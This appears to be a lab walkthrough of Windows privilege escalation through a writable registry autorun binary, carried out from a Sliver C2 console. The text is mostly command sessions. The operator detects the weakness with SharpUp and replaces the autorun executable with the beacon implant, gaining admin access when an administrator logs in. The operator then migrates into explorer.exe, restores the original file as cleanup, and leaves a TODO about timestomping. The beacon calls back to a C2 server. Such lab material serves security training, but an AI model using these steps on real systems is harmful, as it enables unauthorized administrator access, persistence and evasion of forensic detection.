# 03 - Sliver Autorun Exploitation

## 3.1 - Detect

```
sliver (SPATIAL_CLEANER) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon SPATIAL_CLEANER (d2d580fc)

sliver (SPATIAL_CLEANER) > sharpup audit RegistryAutoruns

[*] Tasked beacon SPATIAL_CLEANER (42062d59)

[+] SPATIAL_CLEANER completed task 42062d59

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Registry AutoRun Files ===
        HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe



[*] Completed Privesc Checks in 0 seconds
```

## 3.2 - Exploit

```
sliver (SPATIAL_CLEANER) > download 'C:\Program Files\Autorun Program\program.exe' backups/program.exe

[*] Tasked beacon SPATIAL_CLEANER (e575c7ab)

[+] SPATIAL_CLEANER completed task e575c7ab

[*] Wrote 10240 bytes (1 file successfully, 0 files unsuccessfully) to /home/user/backups/program.exe

sliver (SPATIAL_CLEANER) > upload SPATIAL_CLEANER.exe 'C:\program files\autorun program\program.exe'

[*] Tasked beacon SPATIAL_CLEANER (f4cba34c)

[+] SPATIAL_CLEANER completed task f4cba34c

[*] Wrote file to C:\program files\autorun program\program.exe

sliver (SPATIAL_CLEANER) > kill

⚠  WARNING: This will kill the remote implant process

? Kill the active beacon? Yes
[*] Killed SPATIAL_CLEANER (0fb1b314-6c19-481b-bb51-db1d84953ad2)

sliver > beacons rm

? Select a beacon: 0fb1b314-6c19-481b-bb51-db1d84953ad2  SPATIAL_CLEANER  10.10.221.233:49192  TCM-PC  TCM-PC\user  windows/amd64
[*] Beacon removed (0fb1b314-6c19-481b-bb51-db1d84953ad2)

Now all you have to do is wait for the admin to login

$ xfreerdp /u:<username> /p:<password> /cert:ignore /v:<IP>

[*] Beacon 3a44a160 SPATIAL_CLEANER - 10.10.221.233:49354 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 11:48:09 EST

sliver > beacons

 ID         Name              Tasks   Transport   Remote Address        Hostname   Username   Operating System   Locale   Last Check-In                            Next Check-In
========== ================= ======= =========== ===================== ========== ========== ================== ======== ======================================== =======================================
 3a44a160   SPATIAL_CLEANER   0/0     mtls        10.10.221.233:49354   TCM-PC     TCM        windows/amd64      en-US    Thu Nov 17 11:48:10 EST 2022 (10s ago)   Thu Nov 17 11:48:18 EST 2022 (2s ago)

sliver > use 3a44a160-d68a-4de4-b7e1-da05ec5a45cf

[*] Active beacon SPATIAL_CLEANER (3a44a160-d68a-4de4-b7e1-da05ec5a45cf)

sliver (SPATIAL_CLEANER) > whoami

Logon ID: TCM-PC\TCM
[*] Tasked beacon SPATIAL_CLEANER (acc8ae24)

[+] SPATIAL_CLEANER completed task acc8ae24

sliver (SPATIAL_CLEANER) > execute -o net user TCM

⚠️  Using --output in beacon mode, if the command blocks the task will never complete

[*] Tasked beacon SPATIAL_CLEANER (cbd42349)

[+] SPATIAL_CLEANER completed task cbd42349

[*] Output:
User name                    TCM
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/15/2020 8:38:12 AM
Password expires             Never
Password changeable          4/15/2020 8:38:12 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/17/2022 11:48:43 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *HomeUsers
                             *Remote Desktop Users
Global Group memberships     *None
The command completed successfully.
```

## 3.3 - Cleanup

TODO: List the binary file in order to perform timestomp technique

```
sliver (SPATIAL_CLEANER) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon SPATIAL_CLEANER (1a3e2324)

[*] Session 8cb5a355 SPATIAL_CLEANER - 10.10.221.233:49451 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 11:55:23 EST

sliver (SPATIAL_CLEANER) > sessions

 ID         Name              Transport   Remote Address        Hostname   Username   Operating System   Locale   Last Message                            Health
========== ================= =========== ===================== ========== ========== ================== ======== ======================================= =========
 8cb5a355   SPATIAL_CLEANER   mtls        10.10.221.233:49451   TCM-PC     TCM        windows/amd64      en-US    Thu Nov 17 11:55:23 EST 2022 (5s ago)   [ALIVE]

sliver (SPATIAL_CLEANER) > sessions -i 8

[*] Active session SPATIAL_CLEANER (8cb5a355)

sliver (SPATIAL_CLEANER) > ps

 Pid    Ppid   Owner        Arch     Executable             Session
====== ====== ============ ======== ====================== =========
 0      0                            [System Process]       -1
 4      0                            System                 -1
 404    4                            smss.exe               -1
 536    528                          csrss.exe              -1
 584    528                          wininit.exe            -1
 592    576                          csrss.exe              -1
 632    576                          winlogon.exe           -1
 680    584                          services.exe           -1
 688    584                          lsass.exe              -1
 700    584                          lsm.exe                -1
 784    680                          svchost.exe            -1
 860    680                          svchost.exe            -1
 932    632                          LogonUI.exe            -1
 948    680                          svchost.exe            -1
 996    680                          svchost.exe            -1
 100    680                          svchost.exe            -1
 556    680                          svchost.exe            -1
 1084   680                          svchost.exe            -1
 1208   680                          spoolsv.exe            -1
 1244   680                          svchost.exe            -1
 1360   680                          amazon-ssm-agent.exe   -1
 1472   680                          LiteAgent.exe          -1
 1500   680                          svchost.exe            -1
 1644   680                          Ec2Config.exe          -1
 1956   680                          svchost.exe            -1
 1980   680                          svchost.exe            -1
 1944   784                          WmiPrvSE.exe           -1
 2204   2196                         csrss.exe              -1
 2228   2196                         winlogon.exe           -1
 2384   680                          taskhost.exe           -1
 2508   1084                         rdpclip.exe            -1
 2552   996                          dwm.exe                -1
 2688   2536                         explorer.exe           -1
 2984   680                          SearchIndexer.exe      -1
 2140   680                          TrustedInstaller.exe   -1
 2540   680                          mscorsvw.exe           -1
 2632   680                          mscorsvw.exe           -1
 1420   680                          sppsvc.exe             -1
 2340   680                          wmpnetwk.exe           -1
 1856   2944                         csrss.exe              -1
 748    2944                         winlogon.exe           -1
 540    680    TCM-PC\TCM   x86_64   taskhost.exe           3
 2964   1084   TCM-PC\TCM   x86_64   rdpclip.exe            3
 1012   996    TCM-PC\TCM   x86_64   dwm.exe                3
 1840   2492   TCM-PC\TCM   x86_64   explorer.exe           3
 1140   1840   TCM-PC\TCM   x86_64   program.exe            3

sliver (SPATIAL_CLEANER) > migrate 1840

[*] Successfully migrated to 1840

[*] Beacon eaf82ceb SPATIAL_CLEANER - 10.10.221.233:49549 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 12:02:44 EST

sliver (SPATIAL_CLEANER) > use eaf82ceb-d2ef-4265-bf78-e70473a1b0c8

[*] Active beacon SPATIAL_CLEANER (eaf82ceb-d2ef-4265-bf78-e70473a1b0c8)

sliver (SPATIAL_CLEANER) > getpid

1840

sliver (SPATIAL_CLEANER) > upload backups/program.exe 'C:\Program Files\Autorun Program\program.exe'

[*] Tasked beacon SPATIAL_CLEANER (4c313cce)

[+] SPATIAL_CLEANER completed task 4c313cce

[!] open C:\Program Files\Autorun Program\program.exe: The process cannot access the file because it is being used by another process.

sliver (SPATIAL_CLEANER) > terminate 1140

[!] Please select a session via `use`

sliver (SPATIAL_CLEANER) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon SPATIAL_CLEANER (c521cd66)

[*] Session facb1eaa SPATIAL_CLEANER - 10.10.221.233:49571 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 12:03:42 EST

sliver (SPATIAL_CLEANER) > terminate 1140

[*] Process 1140 has been terminated

[!] Lost session 8cb5a355 SPATIAL_CLEANER - 10.10.221.233:49451 (TCM-PC) - windows/amd64 - Thu, 17 Nov 2022 12:04:01 EST

sliver (SPATIAL_CLEANER) > upload program.exe 'C:\Program Files\Autorun Program\program.exe'

[*] Wrote file to C:\Program Files\Autorun Program\program.exe
```